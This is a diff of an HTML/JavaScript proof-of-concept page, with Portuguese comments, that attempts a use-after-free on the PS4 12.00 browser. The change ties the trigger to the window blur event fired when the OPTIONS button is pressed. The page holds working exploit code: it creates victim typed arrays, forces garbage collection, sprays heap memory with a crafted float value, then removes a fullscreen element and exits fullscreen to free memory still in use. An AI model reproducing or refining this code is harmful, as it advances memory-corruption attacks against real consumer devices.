@@ -2,13 +2,13 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<title>PS4 Fullscreen UAF - Real Trigger</title>
+<title>PS4 Fullscreen UAF - Manual Trigger (Correto)</title>
 </head>
 <body>
 
-<h2>PS4 12.00 - UAF (Real Trigger)</h2>
+<h2>PS4 12.00 - UAF (Fluxo Real com OPTIONS)</h2>
 
-<button onclick="run()">Run Test</button>
+<button onclick="start()">1. Enter Fullscreen</button>
 
 <pre id="log" style="background:#111;color:#0f0;padding:10px;height:400px;overflow:auto;"></pre>
 
@@ -20,12 +20,13 @@ function log(msg) {
 let f64, u32, dv;
 let victimBuffer;
 let fsTarget;
+let blurTriggered = false;
 
-function run() {
-    log("[*] Iniciando teste...");
+function start() {
+    log("[*] Criando objetos...");
 
     // =========================
-    // Criar objetos
+    // Objetos alvo
     // =========================
     victimBuffer = new ArrayBuffer(0x100);
     f64 = new Float64Array(victimBuffer);
@@ -39,7 +40,7 @@ function run() {
     log("[+] Objetos criados");
 
     // =========================
-    // Criar elemento fullscreen
+    // Elemento fullscreen
     // =========================
     fsTarget = document.createElement("div");
     fsTarget.style.width = "100%";
@@ -49,50 +50,69 @@ function run() {
     document.body.appendChild(fsTarget);
 
     fsTarget.webkitRequestFullscreen?.();
+
     log("[*] Fullscreen ativo");
+    log("[*] >>> AGORA APERTE OPTIONS <<<");
 
     // =========================
-    // Trigger crítico
+    // BLUR REAL (ESSENCIAL)
     // =========================
-    setTimeout(() => {
+    window.onblur = function() {
+        if (blurTriggered) return;
+        blurTriggered = true;
 
-        log("[*] Preparando trigger crítico...");
+        log("[EVENT] onblur recebido (OPTIONS)");
 
-        // GC leve
-        for (let i = 0; i < 10000; i++) {
-            new ArrayBuffer(0x2000);
-        }
+        // Delay CRÍTICO
+        setTimeout(() => {
 
-        log("[*] GC executado");
+            log("[*] Janela crítica (~500ms)");
 
-        // Spray leve
-        let spray = [];
-        for (let i = 0; i < 4000; i++) {
-            let arr = new Float64Array(16);
-            arr.fill(2.121995791e-314);
-            spray.push(arr);
-        }
+            // =========================
+            // GC
+            // =========================
+            for (let i = 0; i < 10000; i++) {
+                new ArrayBuffer(0x2000);
+            }
 
-        log("[*] Spray executado");
+            log("[*] GC executado");
 
-        // CHECK antes do crash
-        try {
-            log("---- CHECK PRÉ-TRIGGER ----");
-            log("[F64] " + f64[0]);
-            log("[U32] " + u32[2]);
-            log("[DV] " + dv.getUint32(16, true));
-        } catch (e) {
-            log("[ERRO] " + e);
-        }
+            // =========================
+            // Spray
+            // =========================
+            let spray = [];
+            for (let i = 0; i < 4000; i++) {
+                let arr = new Float64Array(16);
+                arr.fill(2.121995791e-314);
+                spray.push(arr);
+            }
 
-        // 🔥 TRIGGER REAL (SEU BUG)
-        log("[!!!] TRIGGER: remove + exitFullscreen");
+            log("[*] Spray executado");
 
-        fsTarget.remove();
+            // =========================
+            // CHECK
+            // =========================
+            try {
+                log("---- CHECK PRÉ-TRIGGER ----");
+                log("[F64] " + f64[0]);
+                log("[U32] " + u32[2]);
+                log("[DV] " + dv.getUint32(16, true));
+            } catch (e) {
+                log("[ERRO] " + e);
+            }
 
-        document.webkitExitFullscreen?.();
+            // =========================
+            // 🔥 TRIGGER REAL
+            // =========================
+            log("[!!!] TRIGGER: remove + exitFullscreen");
 
-    }, 500); // ← mantém seu timing crítico
+            fsTarget.remove();
+
+            document.webkitExitFullscreen?.();
+
+        }, 500); // ← ESSENCIAL
+
+    };
 }
 </script>
 
